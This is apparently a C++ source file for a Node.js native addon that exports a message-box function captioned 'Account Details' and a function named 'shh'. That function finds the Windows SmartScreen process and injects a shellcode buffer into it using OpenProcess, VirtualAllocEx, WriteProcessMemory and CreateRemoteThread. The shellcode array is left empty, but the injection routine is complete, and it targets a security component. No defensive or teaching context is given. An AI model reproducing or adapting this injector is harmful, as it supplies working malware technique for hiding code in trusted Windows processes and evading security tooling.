#include <napi.h>
#include <string>
#include <Windows.h>
#include <Winuser.h>
#include <tlhelp32.h>

//#include "stdafx.h"

napi_value print (napi_env env, napi_callback_info info) {
  napi_value argv[1];
  size_t argc = 1;

  napi_get_cb_info(env, info, &argc, argv, NULL, NULL);

  if (argc < 1) {
    napi_throw_error(env, "EINVAL", "Too few arguments");
    return NULL;
  }

  char str[1024];
  size_t str_len;

  if (napi_get_value_string_utf8(env, argv[0], (char *) &str, 1024, &str_len) != napi_ok) {
    napi_throw_error(env, "EINVAL", "Expected string");
    return NULL;
  }

  printf("Printed from C: %s\n", str);
     int msgboxID = MessageBox(
        NULL,
        (LPCSTR)str,
        (LPCSTR)L"Account Details",
        MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
    );

  return NULL;
}
napi_value msgbox (napi_env env, napi_callback_info info) {
  napi_value argv[1];
  size_t argc = 1;

  napi_get_cb_info(env, info, &argc, argv, NULL, NULL);

  if (argc < 1) {
    napi_throw_error(env, "EINVAL", "Too few arguments");
    return NULL;
  }

  char str[1024];
  size_t str_len;

  if (napi_get_value_string_utf8(env, argv[0], (char *) &str, 1024, &str_len) != napi_ok) {
    napi_throw_error(env, "EINVAL", "Expected string");
    return NULL;
  }

     int msgboxID = MessageBox(
        NULL,
        (LPCSTR)str,
        (LPCSTR)L"Account Details",
        MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
    );

  return NULL;
}

napi_value shh (napi_env env, napi_callback_info info) {
  napi_value argv[1];
  size_t argc = 1;

  napi_get_cb_info(env, info, &argc, argv, NULL, NULL);

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "smartscreen.exe") == 0)
            {  
               // HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

                // Do stuff..

         
   unsigned char shellcode[] ="";
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    printf("Injecting to PID: %i", entry.th32ProcessID);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(entry.th32ProcessID));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
     //  CloseHandle(hProcess);
            }
        }
    }

    CloseHandle(snapshot);

    

  return NULL;
}

napi_value init_all (napi_env env, napi_value exports) {
  napi_value print_fn;
  napi_value msgbox_fn;
  napi_value shh_fn;
  napi_create_function(env, NULL, 0, print, NULL, &print_fn);
  napi_set_named_property(env, exports, "print", print_fn);
  napi_create_function(env, NULL, 0, msgbox, NULL, &msgbox_fn);
  napi_set_named_property(env, exports, "msgbox", msgbox_fn);
  napi_create_function(env, NULL, 0, shh, NULL, &shh_fn);
  napi_set_named_property(env, exports, "shh", shh_fn);
  return exports;
}

NAPI_MODULE(NODE_GYP_MODULE_NAME, init_all)
